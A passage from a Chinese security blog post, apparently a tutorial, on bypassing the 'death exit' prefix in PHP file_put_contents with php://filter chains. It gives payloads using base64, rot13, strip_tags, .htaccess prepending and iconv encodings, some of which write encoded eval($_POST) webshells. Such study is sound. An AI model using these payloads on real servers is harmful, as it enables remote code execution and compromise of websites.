+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=php://filter/convert.base64-decode/resource=s1mple.php</span><br><span class="line"></span><br><span class="line">$content=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+<p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；payload效果如下：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/1g7oQSLAjG9tdYw.png" alt="image-20220129115805941"></p>
+<h6 id="rot13-编码绕过"><a href="#rot13-编码绕过" class="headerlink" title="rot13 编码绕过"></a>rot13 编码绕过</h6><p>原理和base64一样，可以直接转码分解死亡代码；这里不再多说；直接看如下实验结果即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=php://filter/string.rot13/resource=s1mple.php</span><br><span class="line"></span><br><span class="line">$content=&lt;?cuc cucvasb;?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/PimUnr2QVbwW9Za.png" alt="image-20220129122402813"></p>
+<p>只是这种方法有点尴尬的是；因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用。</p>
+<h6 id="htaccess的预包含利用"><a href="#htaccess的预包含利用" class="headerlink" title=".htaccess的预包含利用"></a>.htaccess的预包含利用</h6><p>利用<code>.htaccess</code>的预包含文件的功能来进行攻破；自定义包含我们的flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=php://filter/write=string.strip_tags/resource=.htaccess</span><br><span class="line"></span><br><span class="line">$content=?&gt;php_value%20auto_prepend_file%20s1mple.php</span><br></pre></td></tr></table></figure>
+<p>同时传入如上的代码，首先来解释$filename的代码，这里引用了string.strip_tags过滤器，可以过滤.htaccess内容的html标签，自然也就消除了死亡代码；$content即闭合死亡代码使其完全消除，并且写入自定义包含文件。实验结果如下所示：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/OV6ced1yrNFGU5B.png" alt="image-20220129124837807"></p>
+<h6 id="过滤器编码组合拳"><a href="#过滤器编码组合拳" class="headerlink" title="过滤器编码组合拳"></a>过滤器编码组合拳</h6><p>过滤器组合拳，其实故名思意，就是利用过滤器嵌套过滤器进行过滤，以此达到代码的层层更迭，从而最后写入我们期望的代码。</p>
+<ul>
+<li><strong>strip_tags + base64</strong></li>
+</ul>
+<p>利用string.strip_tags可以过滤掉html标签，将标签内的所有内容进行删去，然后再进行base64解码，成功写入shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php</span><br><span class="line"></span><br><span class="line">$content=?&gt;PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/6OctPKihHmC9uxA.png" alt="image-20220129125327929"></p>
+<p>但是这种方法有一定的局限性也还是因为string.strip_tags在php7.3.0以上的环境下会发生段错误，从而导致无法写入，但是在php5的环境下则不受此影响。</p>
+<ul>
+<li><strong>三个过滤器</strong></li>
+</ul>
+<p>内容经过压缩转小写然后解压之后，我们的目的代码并没有发生变化，这也为写入木马奠定了基础。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php</span><br><span class="line">$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+<p>虽然写入并没有问题，但测试并没有执行代码。</p>
+<h5 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h5><p>示例代码（f2.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段类似的代码在ThinkPHP5.0.X反序列化中出现过，利用其组合才能够得到RCE。有关ThinkPHP5.0.x的反序列化这里就不说了，主要是探索如何利用<code>php://filter</code>绕过该限制写入shell后门得到RCE的过程。</p>
+<p>和上面的大类方法一样，也是利用php伪协议filter进行嵌套过滤器进行消除死亡代码，然后进行shell的写入或者读取；不过这种因为是一个变量，所以其限制代码为<code>&lt;?php exit();</code> 然而我们之前说到的是因为是控制两个变量，在这种情况之下就为<code>&lt;?php exit();?&gt;</code>,两者有本质的区别，然而第一种情况下，后面的几种解法，其实从某种程度上来说，也是将其看成了一个变量从而的出的payload。</p>
+<h6 id="htacess的预包含利用"><a href="#htacess的预包含利用" class="headerlink" title=".htacess的预包含利用"></a>.htacess的预包含利用</h6><p>和第一种情况一样，利用.htaccess进行预包含，然后读取flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.strip_tags/?&gt;php_value%20auto_prepend_file%20s1mple.php%0a%23/resource=.htaccess</span><br></pre></td></tr></table></figure>
+<h6 id="base64-编码绕过"><a href="#base64-编码绕过" class="headerlink" title="base64 编码绕过"></a>base64 编码绕过</h6><p>看到这种情况其实也可以想到base64利用，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></pre></td></tr></table></figure>
+<p>看起来顺理成章，进行拼接之后就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();php:<span class="comment">//filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span></span><br></pre></td></tr></table></figure>
+<p>然后会对其进行一次整体的base64-decode。从而分解掉死亡代码，但是有个小问题，当时我也有点不解，一直无法生成content；虽然文件创建成功，但是就是无法生成content。原因如下：</p>
+<blockquote>
+<p>‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的</p>
+</blockquote>
+<ul>
+<li><strong>去掉等号之过滤器嵌套base64</strong></li>
+</ul>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</span><br></pre></td></tr></table></figure>
+<p>发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</span><br></pre></td></tr></table></figure>
+<p>我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成s1mple.php文件；从而就可以生成正常的文件名；效果如下：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/ayN5D6b84kqX9rZ.png" alt="image-20220129140724001"></p>
+<ul>
+<li><strong>去掉等号之直接对内容进行变性另类base64</strong></li>
+</ul>
+<p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</span><br></pre></td></tr></table></figure>
+<p>这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接在写中进行过滤掉，然后base64-decode再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果。</p>
+<blockquote>
+<p>注：这两种方法在Windows系统下是实现不了的，因为Windows系统的文件名不能含有<code>?</code>和<code>&gt;</code></p>
+</blockquote>
+<h6 id="rot13-编码绕过-1"><a href="#rot13-编码绕过-1" class="headerlink" title="rot13 编码绕过"></a><strong>rot13 编码绕过</strong></h6><p>尽管base64比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/hfxYmaS2PdCTDKL.png" alt="image-20220129141618539"></p>
+<h6 id="convert-iconv-编码转换绕过"><a href="#convert-iconv-编码转换绕过" class="headerlink" title="convert.iconv.* 编码转换绕过"></a><strong>convert.iconv.* 编码转换绕过</strong></h6><p>这个过滤器需要 php 支持 <code>iconv</code>，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。 然而 我们可以留意到iconv — 字符串按要求的字符编码来转换</p>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iconv ( string $in_charset , string $out_charset , string $str )  </span><br><span class="line"></span><br><span class="line">string 将字符串 str 从 in_charset 转换编码到 out_charset</span><br></pre></td></tr></table></figure>
+<p>就其功能而论，有点类似于<code>base_convert</code>的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已。</p>
+<p>那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换。</p>
+<ul>
+<li><strong>usc-2</strong></li>
+</ul>
+<p>通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/1NxPeJrszE9VLTy.png" alt="image-20220129142457860"></p>
+<ul>
+<li><strong>usc-4</strong></li>
+</ul>
+<p>活用<code>convert.iconv</code>。可以进行usc-4编码转化；就是4位一反转；类比可知，构造的shell代码应该是usc-4中的4倍数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/5NYwQiELOAzgyrT.png" alt="image-20220129142858042"></p>
+<ul>
+<li><strong>utf-8与utf-7之间的转化</strong></li>
+</ul>
+<p>经过测试发现：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/xlLruBtnsCIh5S6.png" alt="image-20220129143423984"></p>
+<p>这里发现生成的是<code>+AD0-</code>，然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell，算上是一种组合拳：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/29/1Ir6TnfpAqCuJbD.png" alt="image-20220129143701048"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>曹玉杰，王乐，李家辉，孔韬循 编著《Web代码安全漏洞深度剖析》</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a></li>
+<li><a target="_blank" rel="noopener" href="https://kradress.github.io/2021/12/07/文件包含.html#环境变量包含">文件包含 - Kradress’s blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.51cto.com/pnig0s1992/400182">LFI通过proc/self/environ直接获取webshell_hackfreer_51CTO博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45116657/article/details/104159063"> LFI（本地文件包含）、RFI（远程文件包含）、PHP封装协议（伪协议）安全问题学习_weixin_45116657的博客-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44597701/article/details/107864981">CTFweb篇-Session包含_weixin_44597701的博客-CSDN博客_session包含</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273">详解利用session进行文件包含_合天网安学院-CSDN博客_session文件包含</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://writeup.ctfhub.com/Skill/Web/RCE/ugwzm7Do95zCPKX1xAo2hN.html">php的input伪协议 | CTFHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaobai141/p/14148026.html">php伪协议实现命令执行的七种姿势(转） - !rbash - 博客园 (cnblogs.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - SegmentFault 思否</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510#h2-1">探索php://filter在实战当中的奇技淫巧 - 安全客，安全资讯平台 (anquanke.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/njqfb/article/details/117574395">ctf 死亡exit绕过<em>njqfb的博客-CSDN博客</em>绕过死亡exit</a></li>
+<li><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/">关于file_put_contents的一些小测试 | Cyc1e’s Blog (cyc1e183.github.io)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.cfyqy.com/article/13364c14.html">PHP file_put_contents 的死亡绕过【ye1s】 (cfyqy.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-15">file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/4089de4e.html">https://plumeria.ltd/post/4089de4e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/inclusion.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/5617fd8e.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/file_delete.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">文件删除漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞的介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">本地文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.</span> <span class="toc-text">普通本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.2.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.</span> <span class="toc-text">Session文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-self-environ-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.</span> <span class="toc-text">&#x2F;proc&#x2F;self&#x2F;environ 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.5.</span> <span class="toc-text">临时文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter-string-strip-tags"><span class="toc-number">2.5.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter-convert-quoted-printable-encode"><span class="toc-number">2.5.2.</span> <span class="toc-text">php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.3.</span> <span class="toc-text">自包含临时文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">本地文件包含的限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6"><span class="toc-number">2.6.1.</span> <span class="toc-text">利用%00截断绕过后缀名限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B6%85%E9%95%BF%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6"><span class="toc-number">2.6.2.</span> <span class="toc-text">利用超长字符截断绕过后缀名限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">远程文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">3.1.</span> <span class="toc-text">普通远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">远程文件包含的限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%97%AE%E5%8F%B7%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E5%90%8D%E9%99%90%E5%88%B6"><span class="toc-number">3.2.1.</span> <span class="toc-text">利用问号截断绕过后缀名限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.1.</span> <span class="toc-text">data:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.2.</span> <span class="toc-text">zip:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.3.</span> <span class="toc-text">phar:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.4.</span> <span class="toc-text">php:&#x2F;&#x2F;input 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.5.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.5.1.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">4.5.2.</span> <span class="toc-text">写入文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87file-put-contents%E2%80%9C%E6%AD%BB%E4%BA%A1exit%E2%80%9D"><span class="toc-number">4.5.3.</span> <span class="toc-text">绕过file_put_contents“死亡exit”</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E5%86%B5%E4%B8%80"><span class="toc-number">4.5.3.1.</span> <span class="toc-text">情况一</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.5.3.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#rot13-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.5.3.1.2.</span> <span class="toc-text">rot13 编码绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">4.5.3.1.3.</span> <span class="toc-text">.htaccess的预包含利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BC%96%E7%A0%81%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">4.5.3.1.4.</span> <span class="toc-text">过滤器编码组合拳</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%83%85%E5%86%B5%E4%BA%8C"><span class="toc-number">4.5.3.2.</span> <span class="toc-text">情况二</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#htacess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">4.5.3.2.1.</span> <span class="toc-text">.htacess的预包含利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#base64-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.5.3.2.2.</span> <span class="toc-text">base64 编码绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#rot13-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-1"><span class="toc-number">4.5.3.2.3.</span> <span class="toc-text">rot13 编码绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#convert-iconv-%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">4.5.3.2.4.</span> <span class="toc-text">convert.iconv.* 编码转换绕过</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/4089de4e.html" title="文件包含漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/inclusion.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件包含漏洞"/></a><div class="content"><a class="title" href="/post/4089de4e.html" title="文件包含漏洞">文件包含漏洞</a><time datetime="2022-01-29T08:00:00.000Z" title="发表于 2022-01-29 16:00:00">2022-01-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/5617fd8e.html" title="文件删除漏洞"><img src="/img/gif/loading4.gif" 